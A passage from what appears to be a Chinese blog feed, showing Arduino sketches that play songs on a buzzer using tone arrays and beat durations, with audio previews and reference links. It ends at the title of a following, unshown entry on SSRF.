class="comment">//每个音符持续的时间，即节拍duration，400是调整时间的越大，曲子速度越慢，越小曲子速度越快，自己掌握吧</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);<span class="comment">//停止当前音符，进入下一音符</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//等待5秒后，循环重新开始</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E5%8D%83%E6%9C%AC%E6%A8%B1.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A1 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A2 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3 556</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A4 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A5 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A6 742</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL1 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL2 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL3 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL4 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL5 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL6 371</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL7 416</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH1 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH2 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH3 1112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH4 1178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH5 1322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH6 1484</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH7 1665</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 这部分是用英文对应了拍子 **********/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这部分就是整首曲子的音符部分,用了一个序列定义为tune，整数 */</span></span><br><span class="line"><span class="keyword">int</span> tune[] = &#123;</span><br><span class="line">  A0,A0,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH3,AH1,AH2,A6,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A5,A1,A2,</span><br><span class="line">  A3,AH1,A6,AH3,</span><br><span class="line">  AH2,AH3,AH2,AH1,AH2,A6,A0,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,AH4,AH4,AH3,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  AH6,A5,A5,A6,A6</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这部分是整首曲子的接拍部分，也定义个序列duration，浮点（数组的个数和前面音符的个数是一样的） */</span></span><br><span class="line"><span class="keyword">float</span> duration[]= &#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**********************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;     <span class="comment">/* 这里定义一个变量，后面用来表示共有多少个音符 */</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>; <span class="comment">/* 蜂鸣器的pin */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* 设置蜂鸣器的pin为输出模式 */</span></span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="comment">/* 这里用了一个sizeof函数，可以查出tone序列里有多少个音符 */</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* 循环音符的次数 */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)&#123;</span><br><span class="line">    <span class="comment">/* 此函数依次播放tune序列里的数组，即每个音符 */</span></span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);</span><br><span class="line">    <span class="comment">/* 每个音符持续的时间，即节拍duration，450是调整时间的越大，曲子速度越慢 */</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">450</span>*duration[x]);</span><br><span class="line">    <span class="comment">/* 停止当前音符，进入下一音符 */</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 等待5秒，重新开始循环 */</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E7%88%B1%E6%8B%BC%E6%89%8D%E4%BC%9A%E8%B5%A2.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC1 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC2 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC3 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC4 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC5 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC6 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC7 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL1 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL2 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL3 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL4 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL5 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL6 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL7 248  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH1 525</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH2 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH3 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH4 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH5 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH6 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH7 990</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//列出全部C调的频率</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//列出所有节拍</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tune[]=                 <span class="comment">//根据简谱列出各频率</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  NTC5,NTC5,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC6,NTC5,NTC6,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC3,NTC3,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC6,NTC5,NTCH3,NTCH3,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH1,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH2,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH2,NTCH2,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC5,NTCH1,NTC6,NTC5,NTC1,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC2,NTC1,NTC2,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC5,NTC5,NTC3,NTCH1,NTC7,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC6,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH2,NTCH1,NTC5,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC0,NTCH3,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC0,NTCH2,NTCH1,NTC6,NTC0,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC6,NTCH1,NTCH1,NTCH1,NTC6,NTC5,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC5,</span><br><span class="line"></span><br><span class="line">  NTC5,NTC6,NTCH1,NTC7,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH3,NTCH3,NTCH2,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTC6,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> durt[]=                   <span class="comment">//根据简谱列出各节拍</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tonepin=<span class="number">8</span>;   <span class="comment">//得用8号接口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pinMode</span>(tonepin,<span class="literal">OUTPUT</span>);</span><br><span class="line"></span><br><span class="line">  length=<span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);   <span class="comment">//计算长度</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">tone</span>(tonepin,tune[x]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">500</span>*durt[x]);   <span class="comment">//这里用来根据节拍调节延时，500这个指数可以自己调整，在该音乐中，我发现用500比较合适。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">noTone</span>(tonepin);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><blockquote><p>美妙的音乐总是那么短暂，试听结束！</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/u011481047/article/details/53257685">Arduino+蜂鸣器制作有趣的小音乐</a></p><p>[2] <a href="https://www.geek-workshop.com/thread-288-1-1.html">Arduino学习笔记—超简单制作音乐</a></p><p>[3] <a href="https://blog.csdn.net/m0_37738838/article/details/95062958?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161742198916780262574621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161742198916780262574621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-13-95062958.pc_search_result_no_baidu_js&utm_term=arduino+%E8%9C%82%E9%B8%A3%E5%99%A8">Arduino 蜂鸣器播放音乐</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞学习</title>
      <link href="posts/18466.html"/>
      <url>posts/18466.html</url>
      
